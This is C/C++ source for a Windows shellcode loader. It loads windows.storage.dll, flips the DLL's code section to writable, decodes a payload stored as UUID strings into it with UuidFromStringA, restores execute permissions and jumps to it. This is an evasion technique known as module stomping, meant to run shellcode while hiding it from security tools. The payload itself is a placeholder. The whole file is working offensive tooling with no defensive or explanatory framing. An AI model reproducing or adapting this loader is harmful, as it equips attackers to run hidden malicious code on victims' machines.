#include <Windows.h>
#include "proto.h"
#include <stdio.h>
#include <iostream>
#include <psapi.h>
#include <rpc.h>
#pragma comment(lib, "Rpcrt4.lib")

// --- Set Payload ---
const CHAR* uuids[] =
{
	"UUID STRING HERE"
};


// --- MAIN ---
int main() {
	
	HANDLE curproc = GetCurrentProcess();

	// Load Windows Storage DLL into local process
	CHAR LoadLib[] = { 'w','i','n','d','o','w','s','.','s','t','o','r','a','g','e','.','d','l','l', 0x0 };
	HMODULE hVictimLib = LoadLibraryA((LPCSTR)LoadLib);
	
	// Get pointer to DLL base address
	DWORD_PTR baseAddress = (DWORD_PTR)hVictimLib;

	// Increment base address by 0x1000 (4096) to arrive at the text section (RX)
	baseAddress += 0x1000; //

	PVOID baseIncrement = (PVOID)baseAddress;

	DWORD oldprotect = 0;
	ULONG NewProtection;
	unsigned __int64 scSize = (unsigned __int64)sizeof(uuids) * 2;

	// Change memory protections to RW
	NtProtectVirtualMemory(curproc, &baseIncrement, (PSIZE_T)&scSize, PAGE_READWRITE, &oldprotect);

	// Write shellcode into DLL address
	for (int count = 0; count < sizeof(uuids) / sizeof(uuids[0]); count++) {
		UuidFromStringA((RPC_CSTR)uuids[count], (UUID*)baseAddress);
		baseAddress += 16;
	}

	// Change memory protections to RX
	NtProtectVirtualMemory(curproc, &baseIncrement, (PSIZE_T)&scSize, PAGE_EXECUTE_READ, &oldprotect);

	// Execute
	void (*go)() = (void (*)()) baseIncrement;
	go();

}
